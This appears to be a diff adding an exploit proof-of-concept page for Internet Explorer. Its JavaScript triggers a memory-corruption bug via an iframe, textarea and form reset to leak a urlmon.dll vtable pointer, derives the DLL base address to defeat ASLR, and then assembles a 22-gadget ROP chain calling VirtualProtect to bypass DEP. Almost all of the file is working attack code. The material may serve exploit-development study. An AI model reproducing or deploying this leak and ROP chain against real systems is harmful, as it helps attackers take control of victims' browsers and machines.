@@ -1,0 +1,109 @@
+<!-- saved from url=(0014)about:internet -->
+<style>
+p.courier { font-family: "Courier New", Courier, monospace;
+}
+</style>
+
+<script>
+
+function run() {
+  var textarea = document.getElementById("textarea");
+  var frame = document.createElement("iframe");
+
+  textarea.appendChild(frame);
+  frame.contentDocument.onreadystatechange = eventhandler;
+  form.reset();
+}
+
+function eventhandler() {
+  document.getElementById("textarea").defaultValue = "foo";
+
+  var x = document.createElement("INPUT");
+  x.setAttribute("type", "range"); // This one leaks urlmon
+
+}
+
+</script>
+<body onload=run()>
+<form id="form">
+<textarea id="textarea" cols="80">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</textarea>  <!-- Leak to URLMON.dll -->
+<!-- <textarea id="textarea" style="display:none" cols="80">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</textarea> -->
+<br><br>
+<input id="clickMe" type="button" value="Get Leaked Address" onclick="printLeak();" />
+
+<script>
+
+function printLeak() {
+
+	var text = document.getElementById("textarea"); 	// Getting the swapped element
+	var leak = text.value.substring(0,2);			// Grabbing index[0:2]
+	var hex = parseInt(leak.charCodeAt(1).toString(16) + leak.charCodeAt().toString(16), 16);
+	// parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 ) 
+ 	// Taken from https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms13_037_svg_dashstyle.rb
+    base_address = hex - 0x4504			// Leaked address is CSecurityManager::`vftable' Set to Global
+	text.value = 
+	"Leaked address: \t0x" + hex.toString(16) + "  CSecurityManager::`vftable'\n"+
+	"Base address: \t\t0x" + base_address.toString(16) + "  (Leaked address - RVA 0x4504)";
+	b2 = document.createElement("button");
+	b2.innerHTML = "Get ROP Chain";
+	b2.onclick = getRopChain;
+	document.body.appendChild(b2);
+}
+
+function getRopChain() {
+		
+	b = document.createElement("form");
+	b.style.fontFamily = "Courier New";
+	document.body.appendChild(b);
+	var g1 = base_address + 0x5fd02;
+	var g2 = base_address + 0xeb0d4;
+	var g3 = base_address + 0xd89b;
+	var g4 = base_address + 0x75126;
+	var g5 = base_address + 0x6aa98;
+	var g6 = base_address + 0x3ecd1;
+	var g7 = 0x00000000;
+	var g8 = base_address + 0xc5942;
+	var g9 = 0xa03c7540;
+	var g10 = base_address + 0x2b801;
+	var g11 = 0x41414141;
+	var g12 = 0x41414141;
+	var g13 = base_address + 0x3da04;
+	var g14 = 0x41414141;
+	var g15 = 0x41414141;
+	var g16 = base_address + 0x4b1aa;
+	var g17 = base_address + 0xe273d;
+	var g18 = base_address + 0x5ff35;
+	var g19 = base_address + 0x49dc2;
+	var g20 = base_address + 0xc5946;
+	var g21 = 0x90909090;
+	var g22 = base_address + 0x6173;
+
+	b.innerHTML=
+	"<h3><u>ROP Chain</u></h3>" +
+	"<b>- RVA Chain created with Mona.py from corelanc0d3r...</b><br>" +
+	"<b>- RVA's added to leaked base address: " + base_address.toString(16) + "</b><br><br>" +
+	g1.toString(16) + " - POP EAX # RETN  [IAT urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x5fd02 <br>" +
+	g2.toString(16) + " - ptr to &VirtualProtect [IAT urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0xeb0d4 <br>" +
+	g3.toString(16) + " - MOV EAX,DWORD PTR DS:[EAX] # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0xd89b <br>" +
+	g4.toString(16) + " - XCHG EAX,ESI # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x75126 <br>" +
+	g5.toString(16) + " - POP EBP # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x6aa98 <br>" +
+	g6.toString(16) + " - & jmp esp [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x3ecd1 <br>" +
+	"00000000" + " - [-] Unable to find gadget to put 00000201 into ebx<br>" +
+	g8.toString(16) + " - POP EAX # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0xc5942 <br>" +
+	g9.toString(16) + " - put delta into eax [-> put 0x00000040 into edx]<br>" +
+	g10.toString(16) + " - ADD EAX,5FC38B00 # POP ESI # POP EBX # RETN 0x08 [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x2b801 <br>" +
+	g11.toString(16) + " - Filler<br>" +
+	g12.toString(16) + " - Filler<br>" +
+	g13.toString(16) + " - XCHG EAX,EDX # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x3da04 <br>" +
+	g14.toString(16) + " - Filler<br>" +
+	g15.toString(16) + " - Filler<br>" +
+	g16.toString(16) + " - POP ECX # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x4b1aa <br>" +
+	g17.toString(16) + " - &Writable location [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0xe273d <br>" +
+	g18.toString(16) + " - POP EDI # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x5ff35 <br>" +
+	g19.toString(16) + " - RETN (ROP NOP) [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x49dc2 <br>" +
+	g20.toString(16) + " - POP EAX # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0xc5946 <br>" +
+	g21.toString(16) + " - nop<br>" +
+	g22.toString(16) + " - PUSHAD # ADD EAX,8B5E5F00 # RETN [urlmon.dll] @ Base: 0x" + base_address.toString(16) + " + RVA Offset: 0x6173 <br>";
+	
+}
+</script>
